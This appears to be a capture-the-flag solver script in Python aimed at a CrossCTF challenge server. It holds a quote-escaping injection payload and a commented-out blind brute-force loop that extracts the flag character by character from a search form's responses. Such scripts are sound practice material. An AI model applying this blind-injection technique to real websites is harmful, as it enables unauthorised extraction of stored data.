#!/usr/bin/env python3
import requests
import string

CHAR_LIST = (string.printable
                .replace(' ', '')
                .replace('\'', '')
                .replace('"', ''))


#payload = "\xbf\x27||Contains(flag,\xbf\x27c\xbf\x27)".replace(' ', '\t')
payload = "CrossCTF".replace(' ', '\t')
flag = "CrossCTF{"

r = requests.post("http://ctf.pwn.sg:8180/?search", 
    data= {
        'username': payload,
        'action': '',
    }
)
if '<td>Exists.</tr>' in r.text:
    print('Exists')

elif '<td>Does not exist.</tr>' in r.text:
    print('Does not exist')

else:
    print(r.text)

'''
while len(flag) < 100: # loop until we bruteforce all letters
    print(f"Progress: {flag} [{len(flag)}]")

    for ch in CHAR_LIST:
        # % and _ are used as wildcards in SQLite.
        # escape them
        ch = ch.replace('%', '\\%') 
        ch = ch.replace('_', '\\_')

        guess = flag + ch
        
        r = requests.post("http://ctf.pwn.sg:8180/?search", 
            data= {
                'username': payload.replace('?', guess),
                'action': '',
            }
        )

        # if successful return
        if '<table>' in r.text:
            username_html = r.text.split('<table>')[1]
            if 'admin' in username_html:
                flag += ch
                print("Success:", ch)
                break
        
        print("Failed:", ch)

    if flag.endswith('}'):
        print("Final flag: ", flag)
        quit()
'''